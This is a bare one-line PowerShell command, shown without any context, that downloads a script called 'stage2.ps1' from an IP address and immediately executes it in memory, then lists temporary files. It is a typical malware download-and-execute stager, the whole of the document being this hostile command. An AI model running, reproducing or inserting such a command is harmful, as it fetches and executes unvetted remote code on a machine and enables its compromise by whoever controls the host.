
$DownloadedScript = (New-Object Net.WebClient).DownloadString('http://198.51.100.172/stage2.ps1'); & ([ScriptBlock]::Create($DownloadedScript)); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
